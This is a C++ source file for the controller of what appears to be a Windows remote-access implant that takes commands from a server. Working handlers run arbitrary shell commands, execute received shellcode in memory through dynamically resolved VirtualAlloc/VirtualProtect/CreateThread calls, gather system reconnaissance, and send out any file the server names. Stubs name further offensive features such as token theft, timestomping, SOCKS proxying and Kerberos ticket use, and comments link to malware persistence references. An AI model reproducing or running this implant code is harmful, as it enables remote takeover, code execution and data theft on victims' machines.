#include "Controller.h"
#include "utils.h"
#include "Recon.h"
#include "DirectoryListing.h"

#include <iostream> // TODO: delete later?
#include <sstream>
#include <string>


#include <cstdlib> // NOTE: needed to execute shell cmd


Controller::Controller(
    MessageHandler* messageHandler, 
    ApiManager* apiManager)
    :
    messageHandler_(messageHandler),
    apiManager_(apiManager)
{
}

void Controller::handleDefault(const InternalMessage& msg)
{
	std::cout << "Controller::handleDefault()" << std::endl;
}

void Controller::handleNone(const InternalMessage& msg)
{
	std::cout << "Controller::handleNone()" << std::endl;
}

// TODO: since this is just for executing commands into cmd, maybe implement a way to use
// ConPTY instead? 
void Controller::handleExecuteCommand(const InternalMessage& msg)
{
	std::cout << "Controller::handleExecuteCommand()" << std::endl;

	// std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;


	// TODO: instead add result into the queue, and have transporter send them all when ready?
	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
	//		 then skip the queue and send the message immediately 

	std::string command = byte2string(msg.data_).c_str();
	std::string result;
	bool commandFailed = false;

	// EASIEST METHOD - just use _popen directly
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe)
	{
		commandFailed = true;
		result = "ERROR: Failed to execute command";
	}
	else
	{
		char buffer[128];
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			result += buffer;
		}
		if (ferror(pipe))
		{
			commandFailed = true;
			result += "\nERROR: Failed to read command output";
		}
		const int exitCode = _pclose(pipe);
		if (exitCode != 0)
		{
			commandFailed = true;
			result += exitCode == -1
				? "\nERROR: Failed to retrieve command exit status"
				: "\nERROR: Command exited with code " + std::to_string(exitCode);
		}
	}

	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID

	InternalMessage outMsg;
	outMsg.data_ = string2byte(result);

	MessageHeader header;
	header.messageType_ = commandFailed ? MessageType::ERROR_REPORT : MessageType::COMMAND_RESULT;
	header.messageId_ = 105; // TODO: use input messageId?
	header.dataSize_ = outMsg.data_.size();
	outMsg.header_ = header;

	messageHandler_->sendMessage(outMsg);
}

void Controller::handleExecuteShellcode(const InternalMessage& msg)
{
	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
    
    typedef LPVOID(WINAPI* FuncVirtualAlloc)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)apiManager_->fProcedures_["VirtualAlloc"];


	//LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPVOID shellMem = pVirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellMem) // TODO: checking if it is NULL would be more correct?
	{
		std::cout << "VirtualAlloc failed" << std::endl;
		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
        return;
	}

	// memcpy(beacon_mem, shellcode, bytes_received);
	// TODO: copy 8 bytes at a time, and then copy left over
	for (unsigned int i = 0; i < msg.header_.dataSize_; ++i)
	{
		((char*)shellMem)[i] = msg.data_[i];
	}

    typedef BOOL(WINAPI* FuncVirtualProtect)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)apiManager_->fProcedures_["VirtualProtect"];

	// EXECUTE_READ.
	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
	// NOTE: virtualProtect is also being called somewhere in the windows api
	if (pVirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
	//if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
	{
		std::cout << "VirtualProtect failed" << std::endl;
		// Fail silently if we cannot make the memory executable.
        return;
	}

	// DEBUG_PRINT("6 - Memory allocated and copied");

    typedef HANDLE(WINAPI* FuncCreateThread)
	(LPSECURITY_ATTRIBUTES lpThreadAttributes, 
     SIZE_T dwStackSize,
     LPTHREAD_START_ROUTINE lpStartAddress, 
     LPVOID lpParameter, 
     DWORD dwCreationFlags, 
     LPDWORD lpThreadId);

    FuncCreateThread pCreateThread = (FuncCreateThread)apiManager_->fProcedures_["CreateThread"];

	// 4.
	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	if (!thread)
	{
		std::cout << "CreateThread failed" << std::endl;
		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
        return;
	}

    typedef DWORD(WINAPI* FuncWaitForSingleObject)
	(HANDLE hHandle, DWORD dwMilliseconds);

    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)apiManager_->fProcedures_["WaitForSingleObject"];

	// DEBUG_PRINT("7 - Thread created, waiting..."); 
	pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
	//WaitForSingleObject(thread, INFINITE); // Wait for thread to complete

    // TODO: virtual free?

}

void Controller::handleSystemInfo(const InternalMessage& msg)
{
	std::cout << "Controller::handleSystemInfo()" << std::endl;
    ReconMessage rMsg{};
    //ZeroMemory(msg, sizeof(ReconMessage));

    // OS Version Info
    //OSVERSIONINFOEX osInfo;
    //osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    //if (GetVersionEx((OSVERSIONINFO*)&osInfo))
    //{
        //rMsg.dwMajorVersion = osInfo.dwMajorVersion;
        //rMsg.dwMinorVersion = osInfo.dwMinorVersion;
        //rMsg.dwBuildNumber = osInfo.dwBuildNumber;
        //rMsg.wProductType = osInfo.wProductType;
    //}
    ///
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    //HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    HMODULE hMod = apiManager_->hModules_[L"ntdll.dll"];
    if (hMod)
    {
        // TODO: use apiManager for this
        //RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)apiManager_->fProcedures_["RtlGetVersion"];
        if (fxPtr != nullptr)
        {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (fxPtr(&rovi) == 0)
            {
                rMsg.dwMajorVersion = rovi.dwMajorVersion;
                rMsg.dwMinorVersion = rovi.dwMinorVersion;
                rMsg.dwBuildNumber = rovi.dwBuildNumber;
            }
        }
    }

    ///


    // RAM Info
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus))
    {
        rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys;
        rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys;
    }

    // Processor Info
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors;
    rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;

    // Get processor name from registry (simplified)
    //GetProcessorName(msg->processorName, sizeof(msg->processorName));

    // Local IP
    //GetLocalIpAddress(msg->localIp, sizeof(msg->localIp));

    // System Names
    // DWORD size = sizeof(msg->computerName);
    // GetComputerNameA(msg->computerName, &size);

    //size = sizeof(msg->userName);
    // GetUserNameA(msg->userName, &size);

    // Domain name (simplified)
    // GetDomainName(msg->domainName, sizeof(msg->domainName));

    // Process name
    // GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName));



    std::ostringstream result;
    result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
    result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n";
    result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n";
    result << "wProductType: " << rMsg.wProductType << "\n";
    result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n";
    result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n";
    result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n";
    result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";

    std::string outMsgData = result.str();

    InternalMessage outMsg;
    outMsg.data_ = string2byte(outMsgData);

    MessageHeader header;
    header.messageType_ = MessageType::COMMAND_RESULT;
    header.messageId_ = 99; // TODO:
    header.dataSize_ = outMsg.data_.size();
    outMsg.header_ = header;

	messageHandler_->sendMessage(outMsg);

}

void Controller::handleEstablishPersistence(const InternalMessage& msg)
{
    // 	RegCreateKey, RegSetValue, RegOpenKey, RegDeleteKey, RegCloseKey
    // 	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
    // https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/wizard_spider/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp

    // taskschd.msc, schtasks, /sc

    // group policy scripts?

    // https://github.com/vxunderground/VX-API/blob/main/VX-API/MpfComModifyShortcutTarget.cpp

    // https://github.com/zer0yu/Awesome-CobaltStrike

    // NOTE: https://bneg.io/2017/05/22/athena-the-cias-rat-vs-empire/

    // https://github.com/Ne0nd0g/merlin/tree/main/data/modules/windows/x64/powershell/persistence

    // https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/ATT%26CK/Persistence.md

    // https://attack.mitre.org/tactics/TA0003/

    // https://github.com/mandiant/SharPersist?tab=readme-ov-file

    // https://github.com/samratashok/nishang?tab=readme-ov-file

    // https://github.com/infosecn1nja/Red-Teaming-Toolkit?tab=readme-ov-file#persistence

    // https://github.com/Karneades/awesome-malware-persistence

}


// TODO: need to resolve all api calls used in this function
// TODO: add ability to upload file in chunks
// TODO: use CreateFileA + WriteFile instead of fopen_s + fwrite
// Purpose: Send a client-side file to the server.
void Controller::handleUpload(const InternalMessage& msg)
{
	std::cout << "Controller::handleUpload()" << std::endl;
	std::string path = byte2string(msg.data_).c_str();


    InternalMessage response;

    response.header_.messageType_ = MessageType::UPLOAD_FILE;
    response.header_.messageId_ = msg.header_.messageId_;

    FILE* file = nullptr;

    if (fopen_s(&file, path.c_str(), "rb") != 0 || !file)
        return;

    // Determine size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize < 0)
    {
        fclose(file);
        return;
    }

    response.data_.resize(static_cast<size_t>(fileSize));

    size_t bytesRead = fread(
        response.data_.data(),
        1,
        response.data_.size(),
        file
    );

    fclose(file);

    if (bytesRead != response.data_.size())
        return;

    response.header_.dataSize_ =
        static_cast<uint32_t>(response.data_.size());

    messageHandler_->sendMessage(response);
}


// TODO: need to resolve all api calls used in this function
// TODO: we shouldn't be opening/creating files with fopen... use virtualalloc/write, etc functions
// Purpose: Receive a file from the server and save it on the client.
void Controller::handleDownload(const InternalMessage& msg)
{
    bool success = false;

    char tempPath[MAX_PATH];
    DWORD pathLength = GetTempPathA(MAX_PATH, tempPath);

    if (pathLength > 0 && pathLength < MAX_PATH)
    {
        std::string filename = "download.bin";
        std::string fullPath = std::string(tempPath) + filename;

        HANDLE file = CreateFileA(
            fullPath.c_str(),
            GENERIC_WRITE,
            0,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (file != INVALID_HANDLE_VALUE)
        {
            size_t totalWritten = 0;
            const auto& data = msg.data_;

            success = true;

            while (totalWritten < data.size())
            {
                DWORD bytesWritten = 0;

                DWORD remaining = static_cast<DWORD>(
                    (std::min)(data.size() - totalWritten,
                        static_cast<size_t>(MAXDWORD))
                    );

                if (!WriteFile(
                    file,
                    data.data() + totalWritten,
                    remaining,
                    &bytesWritten,
                    nullptr
                ) || bytesWritten == 0)
                {
                    success = false;
                    break;
                }

                totalWritten += bytesWritten;
            }

            CloseHandle(file);
        }
    }

    // Send acknowledgment
    InternalMessage response;

    response.header_.messageId_ = msg.header_.messageId_;

    if (success)
    {
        response.header_.messageType_ = MessageType::COMMAND_RESULT;
        response.data_ = string2byte("File downloaded successfully.");
    }
    else
    {
        response.header_.messageType_ = MessageType::ERROR_REPORT;
        response.data_ = string2byte("Failed to save downloaded file.");
    }

    response.header_.dataSize_ =
        static_cast<uint32_t>(response.data_.size());

    messageHandler_->sendMessage(response);
}

// Command placeholders: no filesystem, process, credential, or network operations.
void Controller::sendNotImplemented(const InternalMessage& msg, const char* command)
{
    const std::string text = std::string(command) + " is not implemented.";
    InternalMessage response;
    response.header_.messageType_ = MessageType::ERROR_REPORT;
    response.header_.messageId_ = msg.header_.messageId_;
    response.data_.assign(text.begin(), text.end());
    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
    messageHandler_->sendMessage(response);
}

// Intended purpose: Capture an image of the client desktop.
void Controller::handleScreenshot(const InternalMessage& msg)
{
    sendNotImplemented(msg, "SCREENSHOT");
}

// Intended purpose: Change the client working directory for later relative paths.
void Controller::handleCd(const InternalMessage& msg)
{
    sendNotImplemented(msg, "cd");
}

// Intended purpose: Copy a file or directory to another client-side path.
void Controller::handleCp(const InternalMessage& msg)
{
    // CopyFileA
    sendNotImplemented(msg, "cp");
}

// Intended purpose: List the drives and mounted volumes visible to the client.
void Controller::handleDrives(const InternalMessage& msg)
{
    // GetLogicalDrives
    // GetDriveTypeA
    sendNotImplemented(msg, "drives");
}

// Intended purpose: Stop the client and close its session.
void Controller::handleExit(const InternalMessage& msg)
{
    sendNotImplemented(msg, "exit");
}

// Intended purpose: Inspect privileges available to the current security context.
void Controller::handleGetPrivs(const InternalMessage& msg)
{
    sendNotImplemented(msg, "getprivs");
}

// Intended purpose: Report the user identity under which the client is running.
void Controller::handleGetUid(const InternalMessage& msg)
{
    // GetTokenInformation
    sendNotImplemented(msg, "getuid");
}

// Intended purpose: Use a supplied Kerberos credential cache for authentication.
void Controller::handleKerberosCcacheUse(const InternalMessage& msg)
{
    sendNotImplemented(msg, "kerberos_ccache_use");
}

// Intended purpose: Remove Kerberos tickets from the selected logon context.
void Controller::handleKerberosTicketPurge(const InternalMessage& msg)
{
    sendNotImplemented(msg, "kerberos_ticket_purge");
}

// Intended purpose: Use a supplied Kerberos ticket for authentication.
void Controller::handleKerberosTicketUse(const InternalMessage& msg)
{
    sendNotImplemented(msg, "kerberos_ticket_use");
}

// Intended purpose: Stop a background job tracked by the client.
void Controller::handleJobKill(const InternalMessage& msg)
{
    sendNotImplemented(msg, "jobkill");
}

// Intended purpose: Terminate a selected process on the client.
void Controller::handleKill(const InternalMessage& msg)
{
    // PID
    // OpenProcess/NtOpenProcess
    // TerminateProcess/NtTerminateProcess
    sendNotImplemented(msg, "kill");
}

// Intended purpose: Associate another client session with the selected session.
void Controller::handleLink(const InternalMessage& msg)
{
    sendNotImplemented(msg, "link");
}

// Intended purpose: List the files and directories at a client-side path.
void Controller::handleLs(const InternalMessage& msg)
{
    // GetFileAttributesA - check if path is valid
    // FindFirstFileA - find file in dir
    // FindNextFileA - find next file in dir
    // FindClose - close handle created by FindFirstFileA
    sendNotImplemented(msg, "ls");
}

// Intended purpose: Create a security context from supplied logon credentials.
void Controller::handleMakeToken(const InternalMessage& msg)
{
    sendNotImplemented(msg, "make_token");
}

// Intended purpose: Create a directory on the client.
void Controller::handleMkdir(const InternalMessage& msg)
{
    // CreateDirectoryA / NtCreateFile with the FILE_DIRECTORY_FILE
    sendNotImplemented(msg, "mkdir");
}

// Intended purpose: Move or rename a file or directory on the client.
void Controller::handleMv(const InternalMessage& msg)
{
    // MoveFileA
    sendNotImplemented(msg, "mv");
}

// Intended purpose: Select a parent process ID for future process launches.
void Controller::handlePpid(const InternalMessage& msg)
{
    sendNotImplemented(msg, "ppid");
}

// Intended purpose: List processes running on the client.
void Controller::handlePs(const InternalMessage& msg)
{
    sendNotImplemented(msg, "ps");
}

// Intended purpose: Report the client working directory.
void Controller::handlePwd(const InternalMessage& msg)
{

    std::string path(MAX_PATH, '\0');

    // TODO: should manual resolve this api and use that version instead
    DWORD length = GetCurrentDirectoryA(static_cast<DWORD>(path.size()), path.data());

    if (length > 0 && length < path.size())
    {
        path.resize(length);
    }
    else
    {
        // TODO: throw error... messageType == ERROR_RESULT
        std::cout << "error message here: todo" << std::endl;
    }

    InternalMessage response;
    response.header_.messageType_ = MessageType::PWD;
    response.header_.messageId_ = msg.header_.messageId_;
    response.data_.assign(path.begin(), path.end());
    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
    messageHandler_->sendMessage(response);
}

// Intended purpose: List the subkeys and values of a Windows registry key.
void Controller::handleRegQuery(const InternalMessage& msg)
{
    sendNotImplemented(msg, "reg query");
}

// Intended purpose: Read a specified value from a Windows registry key.
void Controller::handleRegQueryv(const InternalMessage& msg)
{
    sendNotImplemented(msg, "reg queryv");
}

// Intended purpose: Restore the original client security context after impersonation.
void Controller::handleRev2Self(const InternalMessage& msg)
{
    sendNotImplemented(msg, "rev2self");
}

// Intended purpose: Remove a file or directory from the client.
void Controller::handleRm(const InternalMessage& msg)
{
    // GetFileAttributesA - see if path/file is valid and if it's a dir or file
    // DeleteFileA - deletes file
    // RemoveDirectoryA - deletes EMPTY directory
    sendNotImplemented(msg, "rm");
}

// Intended purpose: Forward connections from a client-side port to another endpoint.
void Controller::handleRportfwd(const InternalMessage& msg)
{
    sendNotImplemented(msg, "rportfwd");
}

// Intended purpose: Set an environment variable for the client execution context.
void Controller::handleSetEnv(const InternalMessage& msg)
{
    sendNotImplemented(msg, "setenv");
}

// Intended purpose: Provide a SOCKS proxy through the selected client session.
void Controller::handleSocks(const InternalMessage& msg)
{
    sendNotImplemented(msg, "socks");
}

// Intended purpose: Adopt another process security token for impersonation.
void Controller::handleStealToken(const InternalMessage& msg)
{
    sendNotImplemented(msg, "steal_token");
}

// Intended purpose: Change the filesystem timestamps associated with a file.
void Controller::handleTimeStomp(const InternalMessage& msg)
{
    sendNotImplemented(msg, "timestomp");
}

// Intended purpose: Remove the association between linked client sessions.
void Controller::handleUnlink(const InternalMessage& msg)
{
    sendNotImplemented(msg, "unlink");
}

void Controller::handleListDirectory(const InternalMessage& msg)
{
    InternalMessage response;
    response.header_.messageId_ = msg.header_.messageId_;
    try {
        const std::string path(msg.data_.begin(), msg.data_.end());
        response.data_ = string2byte(directory_listing::list(path));
        response.header_.messageType_ = MessageType::DIRECTORY_LISTING;
    } catch (const std::exception& error) {
        response.header_.messageType_ = MessageType::ERROR_REPORT;
        response.data_ = string2byte(std::string("Directory listing failed: ") + error.what());
    }
    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
    messageHandler_->sendMessage(response);
}
